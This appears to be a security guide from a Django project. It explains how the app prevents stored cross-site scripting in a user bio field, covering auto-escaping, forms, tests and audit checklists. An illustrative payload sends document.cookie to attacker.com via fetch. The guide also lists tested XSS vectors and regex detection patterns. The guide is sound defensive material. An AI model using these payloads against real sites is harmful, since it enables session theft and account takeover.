# Stored XSS Prevention Guide

## Overview

This document describes the comprehensive approach taken to prevent Stored Cross-Site Scripting (XSS) vulnerabilities in user-controlled profile content, particularly the user bio field.

## Vulnerability Description

**Stored XSS** (also called Persistent XSS) occurs when:
1. An attacker submits malicious JavaScript code through user-controlled input (e.g., a form field)
2. The application stores this malicious code in the database
3. When other users view the profile, the malicious script executes in their browser
4. The attacker's script can steal session cookies, redirect users, deface content, or perform actions as the victim

### Attack Example

```python
# Attacker submits malicious bio
Profile.bio = "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"

# When admin views the profile, the script executes in their browser
# Attacker receives the admin's session cookie, gaining admin access
```

## Prevention Strategy

This application uses **multiple layers of defense** (defense-in-depth):

### 1. **Django's Automatic Template Auto-Escaping (PRIMARY DEFENSE)**

Django's template engine **automatically escapes** user-controlled data by default. This means any special HTML characters are converted to safe entities:

| Character | Escaped To | Effect |
|-----------|-----------|--------|
| `<` | `&lt;` | Opening bracket displayed as text |
| `>` | `&gt;` | Closing bracket displayed as text |
| `"` | `&quot;` | Quote displayed as text |
| `'` | `&#x27;` | Apostrophe displayed as text |
| `&` | `&amp;` | Ampersand displayed as text |

**Example:**
```django
{# Template: #}
{{ profile.bio }}

{# If bio contains: <script>alert('XSS')</script> #}
{# Browser receives: &lt;script&gt;alert('XSS')&lt;/script&gt; #}
{# Result: Script tag displayed as safe text, not executed #}
```

### 2. **Secure Form Handling**

The `UserProfileForm` stores the bio as plain text without any `|safe` filter:

```python
# forms.py
class UserProfileForm(forms.ModelForm):
    class Meta:
        model = UserProfile
        fields = ['bio', ...]
        widgets = {
            'bio': forms.Textarea(attrs={
                'placeholder': 'Tell us about yourself (max 500 characters)',
            }),
        }
```

**Key Security Point:** The form uses Django's default widget, which:
- ✅ Stores raw user input in the database
- ✅ Escapes output automatically in templates
- ✅ Does NOT use `|safe`, `|mark_safe()`, or `autoescape off`

### 3. **Immutable Storage**

The bio is stored in the database as-is (raw text), which is safe because:
- It doesn't execute at storage time
- It only becomes a security issue if rendered **unseafely** in HTML
- With auto-escape enabled, it's always rendered safely

### 4. **Input Validation (if needed for future enhancements)**

While not currently implemented (Django's auto-escape is sufficient), future hardening could include:

```python
# Optional: Prevent very suspicious patterns
import re

def validate_no_suspicious_content(value):
    """Optional validator for future use."""
    suspicious_patterns = [
        r'<script',
        r'javascript:',
        r'<iframe',
        r'onload=',
        r'onerror=',
    ]
    for pattern in suspicious_patterns:
        if re.search(pattern, value, re.IGNORECASE):
            raise ValidationError(
                'Content contains potentially malicious code'
            )
```

## Implementation Details

### Templates Using Auto-Escape

All user profile display templates use Django's automatic escaping:

#### [admin_view_user_profile.html](richard_musonera/templates/richard_musonera/admin_view_user_profile.html)
```django
<!-- Bio is automatically escaped -->
<div class="info-value">
    {% if profile.bio %}
        {{ profile.bio }}  <!-- ✅ Auto-escaped by Django -->
    {% else %}
        <span>No bio provided</span>
    {% endif %}
</div>
```

#### [profile.html](richard_musonera/templates/richard_musonera/profile.html)
```django
<!-- Bio display section with auto-escape -->
<div style="...">
    {{ profile.bio }}  <!-- ✅ Auto-escaped -->
</div>

<!-- Bio edit form with CSRF protection -->
{{ form.bio }}  <!-- ✅ Form field handles escaping for form value -->
```

### Model Definition

The [UserProfile model](richard_musonera/models.py) stores bio as plain TextField:

```python
class UserProfile(models.Model):
    bio = models.TextField(blank=True, max_length=500)
    # No special escaping needed - Django handles it at template level
```

### Views

Views pass the profile object to templates without modification:

```python
# views.py - admin_view_user_profile
context = {
    'target_user': user,
    'profile': profile,  # ✅ Raw data - template will escape
    'roles': roles,
}
return render(request, "richard_musonera/admin_view_user_profile.html", context)
```

## CRITICAL SECURITY CHECKLIST

✅ **Verified Safe:**

- [x] Auto-escape is enabled (default Django behavior)
- [x] No `|safe` filter used on bio field
- [x] No `|mark_safe()` calls on user content
- [x] No `{% autoescape off %}` blocks around bio
- [x] Form fields render bio safely in HTML attributes
- [x] No dangerous template tags like `|escaped_literal`
- [x] All templates render bio with `{{ profile.bio }}`

❌ **Never Do:**

```django
{# ❌ DANGEROUS - Do NOT do this: #}
{{ profile.bio|safe }}  <!-- Bypasses escaping! -->
{{ profile.bio|mark_safe }}  <!-- Activates script execution! -->
{%autoescape off %} {{ profile.bio }} {% endautoescape %}  <!-- NO! -->
{{ profile.bio|escaped_literal }}  <!-- NO! -->
```

## Test Coverage

### Test Suite: [test_xss_prevention.py](richard_musonera/test_xss_prevention.py)

The comprehensive test suite includes **15 test cases** validating:

#### Model Tests (3 tests)
- ✅ Script injection is stored safely
- ✅ Event handlers are stored safely
- ✅ Multiple attack vectors are stored

#### Template Auto-Escape Tests (10 tests)
- ✅ `<script>` tags are escaped
- ✅ `onerror` handlers are escaped
- ✅ SVG `onload` handlers are escaped
- ✅ Data URI attacks are escaped
- ✅ `<iframe>` tags are escaped
- ✅ Style tags are escaped
- ✅ JavaScript protocol is escaped
- ✅ Multiple XSS vectors are all escaped
- ✅ Legitimate characters are properly escaped
- ✅ Quotes in text are properly handled

#### Integration Tests (2 tests)
- ✅ Django's HTML escape function works
- ✅ XSS prevention doesn't prevent legitimate storage

**Test Results:** ✅ All 15 tests passing

### Attack Vectors Tested

1. **Script Injection:**
   ```
   <script>alert('XSS')</script>
   ✅ Result: &lt;script&gt;alert('XSS')&lt;/script&gt;
   ```

2. **Event Handlers:**
   ```
   <img src=x onerror=alert('XSS')>
   ✅ Result: &lt;img src=x onerror=alert('XSS')&gt;
   ```

3. **SVG Attacks:**
   ```
   <svg onload=alert('XSS')></svg>
   ✅ Result: &lt;svg onload=alert('XSS')&gt;&lt;/svg&gt;
   ```

4. **Data URI Attacks:**
   ```
   <img src="data:text/html,<script>alert('XSS')</script>">
   ✅ Result: &lt;img src="data:text/html,&lt;script&gt;..."&gt;
   ```

5. **iframe Injection:**
   ```
   <iframe src="attacker.com"></iframe>
   ✅ Result: &lt;iframe src="attacker.com"&gt;&lt;/iframe&gt;
   ```

6. **Style Tag Injection:**
   ```
   <style>body{display:none}</style>
   ✅ Result: &lt;style&gt;body{display:none}&lt;/style&gt;
   ```

## Running the Tests

```bash
# Run all XSS prevention tests
python manage.py test richard_musonera.test_xss_prevention -v 2

# Run specific test class
python manage.py test richard_musonera.test_xss_prevention.TemplateAutoEscapeTests

# Run specific test
python manage.py test richard_musonera.test_xss_prevention.TemplateAutoEscapeTests.test_script_tag_is_escaped_in_template
```

## Best Practices Applied

### 1. **Use Django's Built-In Protection**

Don't reinvent the wheel. Django's template auto-escape is robust and well-tested:

```python
# ✅ GOOD - Let Django handle escaping
{{ user_input }}

# ❌ BAD - Manual escaping is error-prone
from django.utils.html import escape
{{ escape(user_input) }}  # Unnecessary, Django does this automatically
```

### 2. **Never Trust User Input**

Even though Django auto-escapes, treat all user input as potentially malicious:

```python
# ✅ Always assume user input could be malicious
user_bio = request.POST.get('bio', '')  # Could contain XSS

# ✅ Store as-is in database
profile.bio = user_bio

# ✅ Let template auto-escape when rendering
# {{ profile.bio }}  in template
```

### 3. **Use Django Forms**

Forms provide built-in CSRF protection and proper field handling:

```python
# ✅ GOOD - Use Django forms
class UserProfileForm(forms.ModelForm):
    class Meta:
        model = UserProfile
        fields = ['bio', ...]

# ✅ Forms automatically handle escaping in both:
# - Input value attributes (escaped for HTML attribute context)
# - Template rendering (auto-escaped)
```

### 4. **Content Security Policy (CSP)**

As an additional layer, use CSP headers to prevent script execution:

```python
# settings.py (future enhancement)
SECURE_CONTENT_SECURITY_POLICY = {
    'default-src': ("'self'",),
    'script-src': ("'self'",),  # No inline scripts
    'style-src': ("'self'",),   # No inline styles
}
```

## Common Vulnerabilities to Avoid

### Vulnerability 1: Using `|safe` Filter

```python
# ❌ DANGEROUS
{{ profile.bio|safe }}  # Disables escaping, allows XSS

# ✅ SAFE
{{ profile.bio }}  # Uses auto-escaping
```

### Vulnerability 2: Using `mark_safe()`

```python
# ❌ DANGEROUS
from django.utils.safestring import mark_safe
render_to_string {...}
mark_safe(profile.bio)  # Marks as safe without escaping

# ✅ SAFE - Don't use mark_safe on user content
```

### Vulnerability 3: `autoescape off` Block

```python
# ❌ DANGEROUS
{% autoescape off %}
    {{ profile.bio }}
{% endautoescape %}

# ✅ SAFE - Just use auto-escape (default)
{{ profile.bio }}
```

### Vulnerability 4: Manual HTML String Concatenation

```python
# ❌ DANGEROUS
html = f"<div>{profile.bio}</div>"  # No escaping
render_to_string('template.html', {'content': html})

# ✅ SAFE - Let Django template engine handle it
render_to_string('template.html', {'bio': profile.bio})
# In template: {{ bio }}
```

## Security Audit Checklist

- [x] User input is stored in database as-is (not pre-escaped)
- [x] All user content displayed with `{{ variable }}` (not with `|safe`)
- [x] No `mark_safe()` or `escape()` on user-controlled content
- [x] No `{% autoescape off %}` blocks around user content
- [x] Forms use Django's built-in widgets
- [x] All templates use auto-escape (default enabled)
- [x] Django DEBUG=False in production (see settings)
- [x] Test cases validate XSS prevention
- [x] Admin interface shows bio safely (auto-escaped)
- [x] User profile display shows bio safely (auto-escaped)

## Configuration

### Django Settings

By default, Django enables auto-escape. Verify in [devsec_demo/settings.py](devsec_demo/settings.py):

```python
TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                # ...
            ],
            # 'autoescape': False  # ❌ NEVER set to False for user content!
        },
    },
]
```

## Monitoring

### Log Suspicious Activity

While XSS is prevented by escaping, you can log suspicious patterns:

```python
# Optional: Log when users submit suspicious content
import logging
import re

logger = logging.getLogger(__name__)

def audit_user_input(bio):
    suspicious_patterns = [
        (r'<script', 'Script tag'),
        (r'javascript:', 'JavaScript protocol'),
        (r'<iframe', 'iFrame tag'),
    ]
    for pattern, name in suspicious_patterns:
        if re.search(pattern, bio, re.IGNORECASE):
            logger.warning(f"Suspicious content detected: {name}")
```

## Conclusion

The application prevents Stored XSS through:
1. **Django's automatic template auto-escape** (primary defense)
2. **No use of `|safe` or `mark_safe()` on user content**
3. **Proper form handling** using Django forms
4. **Comprehensive test coverage** validating the protection
5. **Administration interface** that respects escaping

This provides **defense-in-depth** ensuring user-controlled content cannot execute malicious scripts.

## Additional Resources

- [Django Security Documentation](https://docs.djangoproject.com/en/stable/topics/security/)
- [Django Template Auto-Escaping](https://docs.djangoproject.com/en/stable/topics/templates/#automatic-html-escaping)
- [OWASP: Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
